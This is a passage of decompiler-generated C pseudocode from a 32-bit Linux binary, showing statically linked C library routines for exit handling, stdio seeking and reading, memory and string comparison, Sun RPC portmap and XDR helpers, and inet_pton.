      v6 = (void (__cdecl *)(_DWORD, int, int, int))v4[1];
      if ( v6 )
        v6(v4[2], v7, v8, v9);
    }
  }
  free(a2, (_DWORD *)_exit_function_table);
}
// 806A5BC: using guessed type int _exit_count;
// 806A5C0: using guessed type int _exit_function_table;

//----- (08057F08) --------------------------------------------------------
_DWORD *__usercall _new_exitfn@<eax>(unsigned __int32 a1@<ebp>, int a2@<edi>)
{
  int v2; // eax@2
  _DWORD *v3; // ebx@2
  int v4; // ebx@5
  char v6; // [esp+18h] [ebp-14h]@1

  pthread_cleanup_push_defer(&v6, (int)pthread_mutex_unlock, (int)&_atexit_lock);
  pthread_mutex_lock((int)&_atexit_lock);
  if ( _exit_slots >= _exit_count + 1 )
    goto LABEL_5;
  v2 = realloc(a1, a2, (char *)_exit_function_table, 16 * _exit_slots + 320);
  v3 = (_DWORD *)v2;
  if ( v2 )
  {
    _exit_slots += 20;
    _exit_function_table = v2;
LABEL_5:
    _exit_cleanup = (int (__cdecl *)(_DWORD))_exit_handler;
    v4 = 16 * _exit_count++;
    v3 = (_DWORD *)(_exit_function_table + v4);
    *v3 = 1;
    goto LABEL_6;
  }
  *(_DWORD *)_errno_location() = 12;
LABEL_6:
  pthread_cleanup_pop_restore(a1, (int)&v6, 1);
  return v3;
}
// 806A464: using guessed type int (__cdecl *_exit_cleanup)(_DWORD);
// 806A5BC: using guessed type int _exit_count;
// 806A5C0: using guessed type int _exit_function_table;
// 806A5C4: using guessed type int _exit_slots;

//----- (08057FB4) --------------------------------------------------------
int __usercall dl_aux_init@<eax>(int a1@<eax>)
{
  int result; // eax@1

  dl_phdr = *(_DWORD *)(a1 + 28);
  result = *(_DWORD *)(a1 + 44);
  dl_phnum = result;
  return result;
}
// 806AB00: using guessed type int dl_phdr;
// 806AB04: using guessed type int dl_phnum;

//----- (08057FC8) --------------------------------------------------------
int __cdecl brk(void *end_data_segment)
{
  unsigned int v1; // eax@1
  unsigned int v2; // ecx@1
  unsigned int v3; // ebx@1
  signed int v4; // ecx@1
  _DWORD *v5; // eax@2

  v1 = sys_brk(end_data_segment);
  v3 = v2;
  v4 = 0;
  _curbrk = v1;
  if ( v1 < v3 )
  {
    v5 = _errno_location();
    v4 = -1;
    *v5 = 12;
  }
  return v4;
}
// 806A5C8: using guessed type int _curbrk;

//----- (08058000) --------------------------------------------------------
_DWORD *__cdecl _cmsg_nxthdr(int a1, _DWORD *a2)
{
  _DWORD *v2; // ecx@2
  unsigned int v3; // edx@2

  if ( *a2 <= 0xBu
    || (v2 = (_DWORD *)((char *)a2 + ((*a2 + 3) & 0xFFFFFFFC)),
        v3 = *(_DWORD *)(a1 + 16) + *(_DWORD *)(a1 + 20),
        (unsigned int)(v2 + 3) > v3)
    || (unsigned int)v2 + ((*v2 + 3) & 0xFFFFFFFC) > v3 )
  {
    v2 = 0;
  }
  return v2;
}

//----- (0805803C) --------------------------------------------------------
int __cdecl fseeko(int a1, int a2, unsigned int whence)
{
  return fseeko64(a1, a2, a2 >> 31, whence);
}

//----- (08058058) --------------------------------------------------------
int printf(void *a1, ...)
{
  off_t v1; // ebp@0
  va_list va; // [esp+24h] [ebp+8h]@1

  va_start(va, a1);
  return vfprintf(v1, stdout, a1, (int)va);
}
// 8058058: can not handle register arguments in vararg function, discarded them

//----- (08058078) --------------------------------------------------------
int __cdecl fseeko64(int a1, int a2, int a3, unsigned int whence)
{
  signed int v4; // ebx@2
  int v5; // ebp@3
  int v6; // eax@10
  char v8; // [esp+20h] [ebp-2Ch]@4
  int v9; // [esp+30h] [ebp-1Ch]@1
  int v10; // [esp+34h] [ebp-18h]@1

  v9 = a2;
  v10 = a3;
  if ( whence <= 2 )
  {
    v5 = *(_DWORD *)(a1 + 52);
    if ( !v5 )
    {
      pthread_cleanup_push_defer(&v8, (int)pthread_mutex_unlock, a1 + 56);
      pthread_mutex_lock(a1 + 56);
    }
    if ( *(_BYTE *)a1 & 0x40 && _stdio_wcommit(a1)
      || whence == 1 && _stdio_adjust_position(a1, (__int64 *)&v9) < 0
      || _stdio_seek(a1, (int)&v9, whence) < 0 )
    {
      v4 = -1;
    }
    else
    {
      *(_WORD *)a1 &= 0xFFB8u;
      v6 = *(_DWORD *)(a1 + 8);
      v4 = 0;
      *(_DWORD *)(a1 + 16) = v6;
      *(_DWORD *)(a1 + 20) = v6;
      *(_DWORD *)(a1 + 24) = v6;
      *(_DWORD *)(a1 + 28) = v6;
      *(_DWORD *)(a1 + 44) = 0;
      *(_BYTE *)(a1 + 2) = 0;
    }
    if ( !v5 )
      pthread_cleanup_pop_restore(0, (int)&v8, 1);
  }
  else
  {
    v4 = -1;
    *(_DWORD *)_errno_location() = 22;
  }
  return v4;
}

//----- (0805815C) --------------------------------------------------------
int __cdecl _stdio_READ(int a1, void *addr, size_t len)
{
  int result; // eax@1
  size_t v4; // edx@1

  result = 0;
  v4 = len;
  if ( !(*(_BYTE *)a1 & 4) )
  {
    if ( (len & 0x80000000) != 0 )
      v4 = 0x7FFFFFFF;
    result = _libc_read(*(_DWORD *)(a1 + 4), addr, v4);
    if ( result <= 0 )
    {
      if ( result )
      {
        *(_WORD *)a1 |= 8u;
        result = 0;
      }
      else
      {
        *(_WORD *)a1 |= 4u;
      }
    }
  }
  return result;
}

//----- (080581A0) --------------------------------------------------------
signed int __cdecl _stdio_adjust_position(int a1, __int64 *a2)
{
  int v2; // edx@1
  __int16 v3; // ax@1
  int v4; // ecx@1
  int v5; // eax@9
  __int64 v6; // rcx@11
  int v7; // esi@11

  v2 = 0;
  v3 = *(_DWORD *)a1;
  v4 = *(_DWORD *)a1 & 3;
  if ( v4 )
  {
    v2 = v4 - 1;
    if ( v4 != 1 )
    {
      if ( HIBYTE(v3) & 8 )
      {
        if ( v2 > 1 || *(_DWORD *)(a1 + 40) )
          return -1;
        v2 = v2 - *(unsigned __int8 *)(a1 + 3) - 1;
        if ( *(_DWORD *)(a1 + 44) > 0 )
          v2 -= *(unsigned __int8 *)(a1 + 2);
      }
    }
  }
  if ( *(_DWORD *)a1 & 0x40 )
    v5 = *(_DWORD *)(a1 + 8);
  else
    v5 = *(_DWORD *)(a1 + 20);
  v6 = *a2;
  v7 = v2 + v5 - *(_DWORD *)(a1 + 16);
  *a2 -= v7;
  if ( *a2 > v6 )
    v7 = -v7;
  if ( v7 < 0 )
    *(_DWORD *)_errno_location() = 75;
  return v7;
}

//----- (08058248) --------------------------------------------------------
int __cdecl _stdio_rfill(int a1)
{
  int result; // eax@1
  int v2; // edx@1

  result = _stdio_READ(a1, *(void **)(a1 + 8), *(_DWORD *)(a1 + 12) - *(_DWORD *)(a1 + 8));
  v2 = *(_DWORD *)(a1 + 8);
  *(_DWORD *)(a1 + 16) = v2;
  *(_DWORD *)(a1 + 20) = result + v2;
  return result;
}

//----- (08058270) --------------------------------------------------------
signed int __cdecl _stdio_trans2r_o(unsigned int *a1, int a2)
{
  int v2; // edx@1

  v2 = (unsigned __int16)*a1;
  if ( !(v2 & a2) )
  {
    if ( v2 & 0x880 )
    {
LABEL_5:
      *(_DWORD *)_errno_location() = 9;
LABEL_6:
      *(_WORD *)a1 |= 8u;
      return -1;
    }
    *(_WORD *)a1 = a2 | *a1;
  }
  if ( *(_WORD *)a1 & 0x10 )
    goto LABEL_5;
  if ( *(_WORD *)a1 & 0x40 )
  {
    if ( _stdio_wcommit((int)a1) )
      goto LABEL_6;
    *(_WORD *)a1 &= 0xFFBFu;
    a1[7] = a1[2];
  }
  *(_WORD *)a1 |= 1u;
  return 0;
}

//----- (080582D8) --------------------------------------------------------
int __cdecl _stdio_seek(int a1, int a2, unsigned int whence)
{
  loff_t v3; // rax@1
  int v4; // ecx@1

  v3 = _libc_lseek64(*(_DWORD *)(a1 + 4), *(_DWORD *)a2, *(_DWORD *)(a2 + 4), whence);
  v4 = v3;
  if ( SHIDWORD(v3) >= 0 )
  {
    *(_QWORD *)a2 = v3;
    v4 = 0;
  }
  return v4;
}

//----- (0805830C) --------------------------------------------------------
int __usercall vfprintf@<eax>(off_t a1@<ebp>, size_t len, void *a3, int a4)
{
  int v4; // edi@1
  int v5; // ebx@4
  char v7; // [esp+10h] [ebp-1Ch]@2

  v4 = *(_DWORD *)(len + 52);
  if ( !v4 )
  {
    pthread_cleanup_push_defer(&v7, (int)pthread_mutex_unlock, len + 56);
    pthread_mutex_lock(len + 56);
  }
  if ( (*(_WORD *)len & 0xC0) == 192 || (v5 = -1, !_stdio_trans2w_o((unsigned int *)len, 128)) )
    v5 = vfprintf_internal(len, a3, a4);
  if ( !v4 )
    pthread_cleanup_pop_restore(a1, (int)&v7, 1);
  return v5;
}

//----- (08058394) --------------------------------------------------------
int __cdecl strcoll(unsigned __int8 *a1, unsigned __int8 *a2)
{
  unsigned __int8 *v2; // esi@1
  unsigned __int8 *v3; // edi@1
  unsigned __int8 v4; // al@2
  bool v5; // cf@2
  bool v6; // zf@2
  int result; // eax@4

  v2 = a1;
  v3 = a2;
  while ( 1 )
  {
    v4 = *v2++;
    v5 = *v3 < v4;
    v6 = *v3++ == v4;
    if ( !v6 )
      break;
    if ( !v4 )
      return 0;
  }
  result = -v5;
  LOBYTE(result) = result | 1;
  return result;
}

//----- (080583B4) --------------------------------------------------------
const char *__cdecl strncat(const char *a1, char *a2, int a3)
{
  char *v3; // esi@1
  char *v4; // edi@1
  int v5; // ecx@1
  char v6; // al@3

  v3 = a2;
  v4 = (char *)&a1[strlen(a1)];
  v5 = a3 + 1;
  while ( --v5 )
  {
    v6 = *v3++;
    *v4++ = v6;
    if ( !v6 )
      return a1;
  }
  *v4 = 0;
  return a1;
}

//----- (080583E4) --------------------------------------------------------
int __usercall memcmp_bytes@<eax>(int a1@<eax>, int a2@<edx>)
{
  int *v2; // ecx@1
  int *v3; // ebx@1
  int v4; // eax@2
  int v5; // edx@2
  int v7; // [esp+0h] [ebp-Ch]@1
  int v8; // [esp+4h] [ebp-8h]@1

  v2 = &v7;
  v8 = a1;
  v7 = a2;
  v3 = &v8;
  do
  {
    v4 = *(unsigned __int8 *)v3;
    v5 = *(unsigned __int8 *)v2;
    v3 = (int *)((char *)v3 + 1);
    v2 = (int *)((char *)v2 + 1);
  }
  while ( v4 == v5 );
  return v4 - v5;
}

//----- (08058407) --------------------------------------------------------
int __cdecl memcmp(int a1, int a2, unsigned int a3)
{
  int v3; // ecx@1
  int v4; // ebx@1
  int result; // eax@3
  unsigned int v6; // edi@7
  unsigned int v7; // eax@7
  int v8; // edx@9
  int v9; // ebp@10
  int v10; // edx@10
  int v11; // esi@11
  int v12; // eax@12
  int v13; // esi@13
  unsigned int v14; // eax@24
  unsigned int *v15; // edx@24
  unsigned int v16; // ecx@26
  unsigned int v17; // esi@26
  int v18; // edi@27
  int v19; // ebp@28
  unsigned int v20; // esi@29
  int v21; // edi@29
  int v22; // ebp@30
  int v23; // edx@32
  int v24; // esi@33
  int v25; // eax@37
  int v26; // ecx@43
  unsigned int v27; // eax@48
  int v28; // [esp+0h] [ebp-3Ch]@31
  int v29; // [esp+4h] [ebp-38h]@5
  int v30; // [esp+8h] [ebp-34h]@6
  int v31; // [esp+Ch] [ebp-30h]@13
  int v32; // [esp+10h] [ebp-2Ch]@24
  char v33; // [esp+14h] [ebp-28h]@24
  unsigned int v34; // [esp+18h] [ebp-24h]@27
  unsigned int v35; // [esp+1Ch] [ebp-20h]@27
  unsigned int v36; // [esp+20h] [ebp-1Ch]@28
  unsigned int v37; // [esp+24h] [ebp-18h]@24
  int v38; // [esp+28h] [ebp-14h]@11

  v3 = a1;
  v4 = a2;
  if ( a3 > 0xF )
  {
    while ( 1 )
    {
      v29 = v4;
      if ( !(v4 & 3) )
        break;
      result = *(unsigned __int8 *)v3 - *(unsigned __int8 *)v4;
      if ( *(unsigned __int8 *)v3 != *(unsigned __int8 *)v4 )
        return result;
      --a3;
      ++v3;
      ++v4;
    }
    v30 = v3;
    if ( v3 & 3 )
    {
      v37 = a3 >> 2;
      v32 = 32 - 8 * (v3 & 3);
      v33 = 8 * (v3 & 3);
      v14 = (a3 >> 2) & 3;
      v15 = (unsigned int *)(v3 & 0xFFFFFFFC);
      if ( v14 == 1 )
      {
        v34 = *v15;
        v20 = v15[1];
        v22 = *(_DWORD *)v4;
        --v37;
        v15 += 2;
        v4 += 4;
        goto LABEL_31;
      }
      if ( v14 < 1 )
      {
        v20 = *v15;
        v36 = v15[1];
        ++v15;
        v21 = *(_DWORD *)v4;
        goto LABEL_33;
      }
      v16 = *v15;
      v17 = v15[1];
      if ( v14 == 3 )
      {
        ++v37;
        v19 = *(_DWORD *)v4;
        v4 -= 4;
        v36 = *v15;
        v35 = v15[1];
        goto LABEL_35;
      }
      v37 += 2;
      v18 = *(_DWORD *)v4;
      --v15;
      v4 -= 8;
      v35 = v16;
      v34 = v17;
      while ( 1 )
      {
        v20 = v15[3];
        v22 = *(_DWORD *)(v4 + 12);
        v28 = (v34 << v32) | (v35 >> v33);
        if ( v28 != v18 )
          break;
        v37 -= 4;
        if ( !v37 )
        {
          v25 = (v20 << v32) | (v34 >> v33);
          v26 = 0;
          if ( v25 == v22 )
            goto LABEL_46;
          v23 = *(_DWORD *)(v4 + 12);
          goto LABEL_45;
        }
        v15 += 4;
        v4 += 16;
LABEL_31:
        v36 = *v15;
        v21 = *(_DWORD *)v4;
        v28 = (v20 << v32) | (v34 >> v33);
        if ( v28 != v22 )
        {
          v23 = v22;
          goto LABEL_40;
        }
LABEL_33:
        v35 = v15[1];
        v19 = *(_DWORD *)(v4 + 4);
        v24 = (v36 << v32) | (v20 >> v33);
        if ( v24 != v21 )
        {
          v23 = v21;
LABEL_37:
          v25 = v24;
          goto LABEL_45;
        }
LABEL_35:
        v34 = v15[2];
        v24 = (v35 << v32) | (v36 >> v33);
        v18 = *(_DWORD *)(v4 + 8);
        if ( v24 != v19 )
        {
          v23 = v19;
          goto LABEL_37;
        }
      }
      v23 = v18;
LABEL_40:
      v25 = v28;
LABEL_45:
      v26 = memcmp_bytes(v25, v23);
LABEL_46:
      result = v26;
    }
    else
    {
      v6 = a3 >> 2;
      v7 = (a3 >> 2) & 3;
      if ( v7 == 1 )
      {
        --v6;
        v31 = *(_DWORD *)v3;
        v3 += 4;
        v13 = *(_DWORD *)v4;
        v4 += 4;
        goto LABEL_14;
      }
      if ( v7 < 1 )
      {
        v12 = *(_DWORD *)v3;
        v10 = *(_DWORD *)v4;
        goto LABEL_15;
      }
      v8 = *(_DWORD *)v3;
      if ( v7 == 3 )
      {
        v11 = *(_DWORD *)v4;
        v3 -= 4;
        v4 -= 4;
        ++v6;
        v38 = v8;
        goto LABEL_16;
      }
      v9 = *(_DWORD *)v3;
      v3 -= 8;
      v10 = *(_DWORD *)v4;
      v4 -= 8;
      v6 += 2;
      while ( 1 )
      {
        v31 = *(_DWORD *)(v3 + 12);
        v12 = v9;
        v13 = *(_DWORD *)(v4 + 12);
        if ( v9 != v10 )
          break;
        v6 -= 4;
        if ( !v6 )
        {
          result = 0;
          if ( v31 == v13 )
            goto LABEL_47;
LABEL_22:
          v10 = v13;
          v12 = v31;
          break;
        }
        v3 += 16;
        v4 += 16;
LABEL_14:
        v12 = *(_DWORD *)v3;
        v10 = *(_DWORD *)v4;
        if ( v31 != v13 )
          goto LABEL_22;
LABEL_15:
        v38 = *(_DWORD *)(v3 + 4);
        v11 = *(_DWORD *)(v4 + 4);
        if ( v12 != v10 )
          break;
LABEL_16:
        v9 = *(_DWORD *)(v3 + 8);
        v10 = *(_DWORD *)(v4 + 8);
        if ( v38 != v11 )
        {
          v10 = v11;
          v12 = v38;
          break;
        }
      }
      result = memcmp_bytes(v12, v10);
    }
LABEL_47:
    if ( !result )
    {
      v27 = a3;
      a3 &= 3u;
      v27 &= 0xFFFFFFFC;
      v3 = v27 + v30;
      v4 = v27 + v29;
      goto LABEL_51;
    }
  }
  else
  {
LABEL_51:
    while ( a3 )
    {
      result = *(unsigned __int8 *)v3 - *(unsigned __int8 *)v4;
      if ( *(unsigned __int8 *)v3 != *(unsigned __int8 *)v4 )
        return result;
      --a3;
      ++v3;
      ++v4;
    }
    result = 0;
  }
  return result;
}

//----- (080586AC) --------------------------------------------------------
int __cdecl rawmemchr(int a1, unsigned __int8 a2)
{
  int result; // eax@1
  _DWORD *v3; // ecx@5
  int v4; // edx@6

  for ( result = a1; result & 3; ++result )
  {
    if ( *(_BYTE *)result == a2 )
      return result;
  }
  v3 = (_DWORD *)result;
  do
  {
    do
    {
      v4 = *v3 ^ (a2 | (a2 << 8) | ((a2 | (a2 << 8)) << 16));
      ++v3;
    }
    while ( !((~v4 ^ (v4 + 2130640639)) & 0x81010100) );
    result = (int)(v3 - 1);
    if ( *((_BYTE *)v3 - 4) == a2 )
      break;
    result = (int)v3 - 3;
    if ( *((_BYTE *)v3 - 3) == a2 )
      break;
    result = (int)v3 - 2;
    if ( *((_BYTE *)v3 - 2) == a2 )
      break;
    result = (int)v3 - 1;
  }
  while ( *((_BYTE *)v3 - 1) != a2 );
  return result;
}

//----- (08058710) --------------------------------------------------------
int __cdecl strspn(char *a1, _BYTE *a2)
{
  int v2; // esi@1
  char *v3; // ebx@1
  _BYTE *i; // edx@3
  char v5; // al@8

  v2 = 0;
  v3 = a1;
LABEL_8:
  v5 = *v3;
  if ( *v3 )
  {
    for ( i = a2; *i; ++i )
    {
      if ( v5 == *i )
      {
        if ( !v5 )
          return v2;
        ++v2;
        ++v3;
        goto LABEL_8;
      }
    }
  }
  return v2;
}

//----- (08058744) --------------------------------------------------------
int __cdecl ffs(int a1)
{
  int v1; // eax@1
  char v2; // dl@1
  int v3; // ecx@9

  v1 = a1;
  v2 = 1;
  if ( !(_WORD)a1 )
  {
    v1 = a1 >> 16;
    v2 = 17;
  }
  if ( !(_BYTE)v1 )
  {
    v1 >>= 8;
    v2 += 8;
  }
  if ( !(v1 & 0xF) )
  {
    v1 >>= 4;
    v2 += 4;
  }
  if ( !(v1 & 3) )
  {
    v1 >>= 2;
    v2 += 2;
  }
  v3 = 0;
  if ( v1 )
    v3 = v2 + (((_BYTE)v1 + 1) & 1);
  return v3;
}

//----- (08058789) --------------------------------------------------------
signed int authnone_validate()
{
  return 1;
}

//----- (0805878F) --------------------------------------------------------
int authnone_refresh()
{
  return 0;
}

//----- (08058793) --------------------------------------------------------
int __usercall authnone_marshal@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3, int a4)
{
  _DWORD *v4; // eax@1
  int v5; // edx@1
  int v6; // eax@1

  v4 = _rpc_thread_variables(a1, a2);
  v5 = 0;
  v6 = v4[38];
  if ( v6 )
    v5 = (*(int (__cdecl **)(int, int, _DWORD, _DWORD))(*(_DWORD *)(a4 + 4) + 12))(a4, v6 + 40, *(_DWORD *)(v6 + 60), 0);
  return v5;
}

//----- (080587C6) --------------------------------------------------------
char *__usercall authnone_create@<eax>(off_t a1@<ebp>, int a2@<edi>)
{
  _DWORD *v2; // ebx@1
  char *v3; // esi@1
  char *result; // eax@2
  void (__cdecl *v5)(char *); // eax@5
  char v6; // [esp+18h] [ebp-24h]@5
  int v7; // [esp+1Ch] [ebp-20h]@5

  v2 = _rpc_thread_variables(a1, a2);
  v3 = (char *)v2[38];
  if ( !v3 )
  {
    v3 = (char *)calloc(a1, a2, 1u, 64);
    result = 0;
    if ( !v3 )
      return result;
    v2[38] = v3;
  }
  if ( !*((_DWORD *)v3 + 15) )
  {
    memcpy(v3 + 12, (char *)&null_auth, 0xCu);
    memcpy(v3, v3 + 12, 0xCu);
    *((_DWORD *)v3 + 8) = &ops;
    xdrmem_create(&v6, (int)(v3 + 40), 20, 0);
    xdr_opaque_auth((int)&v6, (int)v3);
    xdr_opaque_auth((int)&v6, (int)(v3 + 12));
    *((_DWORD *)v3 + 15) = (*(int (__cdecl **)(char *))(v7 + 16))(&v6);
    v5 = *(void (__cdecl **)(char *))(v7 + 28);
    if ( v5 )
      v5(&v6);
  }
  return v3;
}
// 805BDEC: using guessed type int (*ops)();
// 806AA20: using guessed type int null_auth;

//----- (08058878) --------------------------------------------------------
_BOOL4 __usercall xdr_authunix_parms@<eax>(int a1@<eax>, unsigned __int32 a2@<ebp>, _DWORD *a3, int a4)
{
  _BOOL4 result; // eax@5

  if ( xdr_u_long(a1, (int)a3, (_DWORD *)a4)
    && xdr_string(a2, a3, (const char **)(a4 + 4), 0xFFu)
    && xdr_u_int(a3, a4 + 8)
    && xdr_u_int(a3, a4 + 12) )
  {
    result = xdr_array(
               a2,
               a3,
               (_DWORD **)(a4 + 20),
               (unsigned int *)(a4 + 16),
               0x10u,
               4u,
               (int (__cdecl *)(_DWORD *, _DWORD *, signed int, unsigned int))xdr_u_int) != 0;
  }
  else
  {
    result = 0;
  }
  return result;
}
// 8056BAF: using guessed type int __cdecl xdr_u_int(_DWORD, _DWORD);

//----- (080588FC) --------------------------------------------------------
signed int __cdecl bindresvport(int a1, __int16 *a2)
{
  __int16 *v2; // ebx@1
  signed int result; // eax@4
  _DWORD *v4; // eax@7
  signed int v5; // esi@7
  _DWORD *v6; // edi@7
  __int16 v7; // ax@8
  __int16 v8; // dx@8
  __int16 v9; // [esp+Ch] [ebp-20h]@2

  v2 = a2;
  if ( a2 )
  {
    if ( *a2 != 2 )
    {
      *(_DWORD *)_errno_location() = 96;
      return -1;
    }
  }
  else
  {
    v2 = &v9;
    memset(&v9, 0, 0x10u);
    v9 = 2;
  }
  if ( !port_2347 )
    port_2347 = getpid() % 424 + 600;
  v4 = _errno_location();
  v5 = 0;
  v6 = v4;
  *v4 = 98;
  for ( result = -1; v5 <= 423 && result < 0 && *v6 == 98; result = bind(a1, (int)v2, 16) )
  {
    v7 = port_2347 + 1;
    v8 = __ROR2__(port_2347, 8);
    v2[1] = v8;
    port_2347 = v7;
    if ( v7 > 1023 )
      port_2347 = 600;
    ++v5;
  }
  return result;
}
// 806A5CC: using guessed type __int16 port_2347;

//----- (080589C8) --------------------------------------------------------
signed int __usercall _get_myaddress@<eax>(int a1@<eax>)
{
  signed int fd; // ebp@1
  char *v2; // esi@6
  int i; // edi@6
  int v5; // [esp+14h] [ebp-1048h]@1
  signed int v6; // [esp+18h] [ebp-1044h]@3
  char v7; // [esp+24h] [ebp-1038h]@3
  int v8; // [esp+1024h] [ebp-38h]@7
  __int16 v9; // [esp+1034h] [ebp-28h]@9
  int v10; // [esp+1044h] [ebp-18h]@3
  char *v11; // [esp+1048h] [ebp-14h]@3

  v5 = a1;
  fd = socket(2, 2, 0);
  if ( fd < 0 )
  {
    perror("__get_myaddress: socket");
    goto LABEL_5;
  }
  v10 = 4096;
  v11 = &v7;
  v6 = 1;
  if ( (ioctl(fd, 35090) & 0x80000000) != 0 )
  {
    perror("__get_myaddress: ioctl (get interface configuration)");
    goto LABEL_5;
  }
  while ( 1 )
  {
    v2 = v11;
    for ( i = v10; i; i -= 32 )
    {
      memcpy((char *)&v8, v2, 0x20u);
      if ( (ioctl(fd, 35091) & 0x80000000) != 0 )
      {
        perror("__get_myaddress: ioctl");
LABEL_5:
        exit(fd, 1);
      }
      if ( v9 & 1 && *((_WORD *)v2 + 8) == 2 && (v9 & 8 || !v6) )
      {
        memcpy((char *)v5, v2 + 16, 0x10u);
        *(_WORD *)(v5 + 2) = 28416;
        _libc_close(fd);
        return 1;
      }
      v2 += 32;
    }
    if ( v6 != 1 )
      break;
    v6 = 0;
  }
  _libc_close(fd);
  return 0;
}

//----- (08058B06) --------------------------------------------------------
int __usercall pmap_unset@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3, int a4)
{
  char **v4; // ebx@2
  int v6; // [esp+10h] [ebp-2Ch]@3
  int v7; // [esp+14h] [ebp-28h]@3
  int v8; // [esp+18h] [ebp-24h]@3
  int v9; // [esp+1Ch] [ebp-20h]@3
  char v10; // [esp+20h] [ebp-1Ch]@1
  int v11; // [esp+30h] [ebp-Ch]@3
  int v12; // [esp+34h] [ebp-8h]@1

  v12 = -1;
  if ( !_get_myaddress((int)&v10) )
    return 0;
  v4 = clntudp_bufcreate(a1, a2, (int)&v10, 100000, 2, timeout_0, 0, &v12, 400, 400);
  if ( !v4 )
    return 0;
  v8 = 0;
  v6 = a3;
  v7 = a4;
  v9 = 0;
  (*(void (__cdecl **)(char **, signed int, int (__usercall *)@<eax>(int@<eax>, int, _DWORD *), int *, int (__usercall *)@<eax>(int@<eax>, int, _DWORD *)))v4[1])(
    v4,
    2,
    xdr_pmap,
    &v6,
    xdr_bool);
  (*((void (__cdecl **)(char **))v4[1] + 4))(v4);
  return v11;
}
// 805BE7C: using guessed type int timeout_0;

//----- (08058BB8) --------------------------------------------------------
int __usercall pmap_set@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3, int a4, int a5, unsigned __int16 a6)
{
  char **v6; // ebx@2
  int v8; // [esp+Ch] [ebp-30h]@3
  int v9; // [esp+10h] [ebp-2Ch]@3
  int v10; // [esp+14h] [ebp-28h]@3
  int v11; // [esp+18h] [ebp-24h]@3
  char v12; // [esp+1Ch] [ebp-20h]@1
  int v13; // [esp+2Ch] [ebp-10h]@3
  int v14; // [esp+30h] [ebp-Ch]@1

  v14 = -1;
  if ( !_get_myaddress((int)&v12) )
    return 0;
  v6 = clntudp_bufcreate(a1, a2, (int)&v12, 100000, 2, timeout_0, 0, &v14, 400, 400);
  if ( !v6 )
    return 0;
  v8 = a3;
  v9 = a4;
  v10 = a5;
  v11 = a6;
  if ( (*(int (__cdecl **)(char **, signed int, int (__usercall *)@<eax>(int@<eax>, int, _DWORD *), int *, int (__usercall *)@<eax>(int@<eax>, int, _DWORD *), int *, int, _DWORD))v6[1])(
         v6,
         1,
         xdr_pmap,
         &v8,
         xdr_bool,
         &v13,
         tottimeout_0,
         0) )
  {
    clnt_perror(a1, a2, (int)v6, (int)"Cannot register service");
    v13 = 0;
  }
  (*((void (__cdecl **)(char **))v6[1] + 4))(v6);
  return v13;
}
// 805BE7C: using guessed type int timeout_0;
// 805BE84: using guessed type int tottimeout_0;

//----- (08058C90) --------------------------------------------------------
int rpc_dtablesize()
{
  if ( !size_3882 )
    size_3882 = getdtablesize();
  return size_3882;
}
// 806A5D0: using guessed type int size_3882;

//----- (08058CB0) --------------------------------------------------------
int __usercall xdr_vector@<eax>(int result@<eax>, int a2, int a3, unsigned int a4, int a5, int (__cdecl *a6)(int, int, signed int, int))
{
  unsigned int v6; // esi@1
  int v7; // ebx@1

  v6 = 0;
  v7 = a3;
  while ( v6 < a4 )
  {
    result = a6(a2, v7, -1, result);
    if ( !result )
      return result;
    v7 += a5;
    ++v6;
  }
  return 1;
}

//----- (08058CEE) --------------------------------------------------------
signed int __usercall xdr_array@<eax>(off_t a1@<ebp>, _DWORD *a2, _DWORD **a3, unsigned int *a4, unsigned int a5, unsigned int a6, int (__cdecl *a7)(_DWORD *, _DWORD *, signed int, unsigned int))
{
  _DWORD *v7; // ebx@1
  unsigned int v8; // edi@2
  unsigned int v9; // edx@3
  signed int i; // esi@11
  unsigned int v11; // ebp@13
  int v12; // eax@14

  v7 = *a3;
  if ( !xdr_u_int(a2, a4) )
    return 0;
  v8 = *a4;
  if ( *a4 > a5 || (v9 = 0xFFFFFFFF % a6, v8 > 0xFFFFFFFF / a6) )
  {
    v9 = (unsigned int)a2;
    if ( *a2 != 2 )
      return 0;
  }
  if ( !v7 )
  {
    v9 = (unsigned int)a2;
    if ( *a2 == 1 )
    {
      if ( !v8 )
        return 1;
      v7 = (_DWORD *)malloc(a1, v8, v8 * a6);
      *a3 = v7;
      if ( !v7 )
      {
        fputs(a1, "xdr_array: out of memory\n", stderr);
        return 0;
      }
      memset(v7, 0, v8 * a6);
    }
    else if ( *a2 == 2 )
    {
      return 1;
    }
  }
  v11 = 0;
  for ( i = 1; v11 < v8 && i; i = v12 )
  {
    ++v11;
    v12 = a7(a2, v7, -1, v9);
    v7 = (_DWORD *)((char *)v7 + a6);
  }
  if ( *a2 == 2 )
  {
    free(v11, *a3);
    *a3 = 0;
  }
  return i;
}
// 8056BAF: using guessed type int __cdecl xdr_u_int(_DWORD, _DWORD);

//----- (08058DFC) --------------------------------------------------------
signed int __usercall inet_pton4@<eax>(char *a1@<eax>, char *a2@<edx>)
{
  char *v2; // ebp@1
  char *v3; // ebx@1
  int v4; // edx@1
  signed int v5; // edi@1
  char *v6; // esi@1
  unsigned int v7; // eax@3
  int v8; // ecx@11
  char v10; // [esp+18h] [ebp-14h]@1

  v2 = a2;
  v3 = a1;
  v4 = 0;
  v5 = 0;
  v6 = &v10;
  v10 = 0;
  while ( 1 )
  {
    v8 = *v3++;
    if ( !v8 )
      break;
    if ( (unsigned int)(v8 - 48) > 9 )
    {
      if ( v8 != 46 || !v4 || v5 == 4 )
        return 0;
      ++v6;
      v4 = 0;
      *v6 = 0;
    }
    else
    {
      v7 = 10 * (unsigned __int8)*v6 + v8 - 48;
      if ( v7 > 0xFF )
        return 0;
      *v6 = v7;
      if ( !v4 )
      {
        if ( ++v5 > 4 )
          return 0;
        LOBYTE(v4) = 1;
      }
    }
  }
  if ( v5 > 3 )
  {
    memcpy(v2, &v10, 4u);
    return 1;
  }
  return 0;
}

//----- (08058E82) --------------------------------------------------------
signed int __cdecl inet_pton(int a1, char *a2, char *a3)
{
  char *v3; // edi@1
  signed int result; // eax@4
  char *v5; // eax@3
  char *v6; // ebx@5
  int v7; // eax@8
  unsigned int v8; // ebp@9
  signed int v9; // eax@21
  int v10; // eax@24
  int v11; // esi@24
  signed int v12; // esi@29
  int v13; // edi@29
  char *v14; // ecx@31
  char *v15; // eax@31
  signed int v16; // [esp+Ch] [ebp-30h]@18
  char *v17; // [esp+10h] [ebp-2Ch]@7
  unsigned int v18; // [esp+14h] [ebp-28h]@5
  char *v19; // [esp+18h] [ebp-24h]@7
